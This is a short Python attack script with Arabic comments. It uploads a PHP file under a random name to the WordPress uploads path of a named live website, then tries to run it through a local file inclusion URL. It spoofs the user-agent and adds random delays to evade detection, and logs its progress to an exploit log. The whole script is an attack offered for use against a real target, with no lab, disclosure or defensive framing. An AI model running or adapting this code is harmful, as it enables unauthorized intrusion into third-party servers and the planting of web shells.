import requests
import random
import string
import time
import os

# توليد اسم ملف عشوائي
def random_filename(extension=".php"):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(10)) + extension

# تسجيل النشاطات
def log_activity(data):
    with open("exploit_log.txt", "a") as log_file:
        log_file.write(data + "\n")

# إعداد تأخير عشوائي
def random_delay():
    time.sleep(random.uniform(1, 5))

# تحميل ملف الاستغلال
def upload_exploit_file(url, session, file_path):
    # التحقق من وجود الملف
    if not os.path.exists(file_path):
        print("الملف غير موجود:", file_path)
        return
    
    file_name = random_filename()
    try:
        # فتح الملف والتحقق
        with open(file_path, 'rb') as file:
            files = {'file': (file_name, file, 'application/x-php')}
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'Referer': url,
            }
            
            # تأخير بين الطلبات
            random_delay()
            
            # إرسال الطلب
            response = session.post(f"{url}/wp-content/uploads", files=files, headers=headers)
            
            if response.status_code == 200:
                check_url = f"{url}/wp-content/uploads/{file_name}"
                log_activity(f"تم رفع الملف بنجاح إلى: {check_url}")
                print("تم رفع الملف بنجاح:", check_url)
                
                # تحقق من وصول LFI
                lfi_url = f"{url}/index.php?page={file_name}"
                lfi_response = session.get(lfi_url)
                if "Expected Payload Output" in lfi_response.text:
                    log_activity("تم تنفيذ الشيفرة بنجاح عبر LFI.")
                    print("تم تنفيذ الشيفرة بنجاح عبر LFI!")
                else:
                    print("فشل تنفيذ الشيفرة عبر LFI.")
            else:
                log_activity(f"فشل تحميل الملف، حالة الرد: {response.status_code}")
                print("فشل تحميل الملف.")
    except requests.exceptions.RequestException as e:
        log_activity(f"خطأ في الاتصال: {e}")
        print("خطأ في الاتصال:", e)

# إعداد الجلسة واستخدام الأداة
url = "https://oimt.ac.in"
session = requests.Session()
file_path = "/sec/root/charon_tool/313.php"
upload_exploit_file(url, session, file_path)
